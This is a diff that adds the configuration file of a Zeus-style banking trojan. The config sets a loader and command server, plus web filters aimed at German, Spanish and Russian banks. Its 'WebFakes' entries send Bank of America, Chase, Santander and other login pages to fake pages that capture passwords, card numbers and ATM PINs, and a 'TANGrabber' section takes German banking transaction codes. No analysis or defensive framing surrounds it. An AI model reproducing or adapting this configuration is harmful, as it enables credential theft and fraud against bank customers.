@@ -1,0 +1,72 @@
+;Build time:   00:56:16 23.05.2008 GMT
+;Version:      1.0.6.8
+
+entry "StaticConfig"
+	;botnet "btn1"
+	timer_config 60 4
+	timer_logs 1 1
+	timer_stats 20 5
+	url_config "/cfg.bin"
+	url_compip "http://myip.ru" 1024
+	;blacklist_languages 1033
+end
+
+entry "DynamicConfig"
+	url_loader "/ldr.exe"
+	url_server "/s.php"
+	file_webinjects "webinjects.txt"
+
+	entry "AdvancedConfigs"
+		;"http://advdomain/cfg1.bin"
+	end
+
+	entry "WebFilters"
+		"!*.microsoft.com/*"
+		"!http://*myspace.com*"
+		"https://www.gruposantander.es/*"
+		"!http://*odnoklassniki.ru/*"
+		"!http://vkontakte.ru/*"
+		"https://internetbanking.gad.de/*/portal?bankid=*"
+		"https://www.vr-networld-ebanking.de/index.php?RZKZ=*&RZBK=*"
+		"https://finanzportal.fiducia.de/*?rzid=*&rzbk=*"
+		"@*/login.osmp.ru/*"
+		"@*/atl.osmp.ru/*"
+	end
+
+	entry "WebDataFilters"
+		;"http://mail.rambler.ru/*" "passw;login"
+	end
+
+	entry "WebFakes"
+		;US
+		"https://sitekey.bankofamerica.com/sas/signon.do"                                                   "/fk/US/bofa.php"                 "P" "*USpass=*" ""
+		"https://chaseonline.chase.com/siteminderagent/forms/formpost.fcc"                                  "/fk/US/chase.php"                "P" "*CCNumber=*&ATMPIN=*" ""
+
+		;ES
+		"https://www.bancajaproximaempresas.com/ControlEmpresas"                                            "/fk/ES/bancaja_e.php"            "P" "*ESpass*" "*EXE=PBPE0011*firma1=*"
+		"https://www.bancaja.*/ControlParticulares"                                                         "/fk/ES/bancaja_p.php"            "P" "*ESpass*" "*EXE=PBCJ0001*firma1=*"
+		"https://www.gruposantander.es/bog/sbi"                                                             "/fk/ES/gruposantander.php"       "GP" "*ESpass=*" ""
+		"https://www.unicaja.es/PortalServlet*pag=1110902071492*"                                           "/fk/ES/unicaja.php"              "G"  "" ""
+		"https://www2.bancopopular.es/AppBPE/servlet/servin?p_pm=bo&p_pf=c&p_id=esp"                        "/fk/ES/bancopopular.es.php"      "G"  "" ""
+
+		;RU
+		"https://www.paymer.com/ecc/default.aspx?t=wmredeem&lang=ru-##"                                     "/fk/RU/wmredeem_ru.php"          "P" "" "*txtOrderNumber*txtOrderCode*"
+		"https://www.paymer.com/ecc/default.aspx?t=wmredeem&lang=en-##"                                     "/fk/RU/wmredeem_en.php"          "P" "" "*txtOrderNumber*txtOrderCode*"
+	end
+
+	entry "TANGrabber"
+		"https://banking.*.de/cgi/ueberweisung.cgi/*" "S3R1C6G" "*&tid=*" "*&betrag=*"
+		"https://internetbanking.gad.de/banking/*" "S3C6" "*" "*" "KktNrTanEnz"
+		"https://www.citibank.de/*/jba/mp#/SubmitRecap.do" "S3C6R2" "SYNC_TOKEN=*" "*"
+		"https://www.vr-networld-ebanking.de/ebanking*Action=*" "S3C6G" "*" "*" "Schmetterling"
+		"https://finanzportal.fiducia.de/ebanking*Action=*" "S3C6" "*" "*" "Schmetterling"
+		"https://finanzportal.fiducia.de/ebbg2/portal?token=*" "S3C6" "*decBetrag=*" "*" "value_*"
+		"https://onlinebanking.norisbank.de/norisbank/*.do?method=*" "S3C6" "*" "*" "tan"
+		"https://www.dresdner-privat.de/servlet/*" "S3C6" "*&CMD=stapelFreigeben&*" "*"
+		"https://brokerage.comdirect.de/servlet/*TAN*" "S3C6" "*transactionID=*" "*"
+	end
+
+	entry "DnsMap"
+		;127.0.0.1 microsoft.com
+	end
+end
